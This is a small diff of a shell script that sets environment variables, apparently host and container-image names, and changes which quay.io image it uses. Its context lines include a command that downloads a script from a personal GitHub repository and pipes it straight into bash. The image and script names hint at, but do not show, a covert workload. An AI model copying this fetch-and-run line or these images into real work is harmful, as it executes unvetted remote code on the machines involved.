@@ -9,7 +9,8 @@ export su_img_3=$(cat read.me)
 curl https://raw.githubusercontent.com/GH0STAV0/lsq_0_c/main/runn_van.sh | bash
 echo  $su_img_3
 export host=$su_img_3"-gc-emma-"
-export img="quay.io/mylastres0rt05/van_git_repo_image"
+#export img="quay.io/mylastres0rt05/van_git_repo_image"
+export img="quay.io/cata0nana/vanish_bo_indabox_qu"
 export im5g="quay.io/xm0uray/ham_ham_img"
 export sess="p"
 echo $img
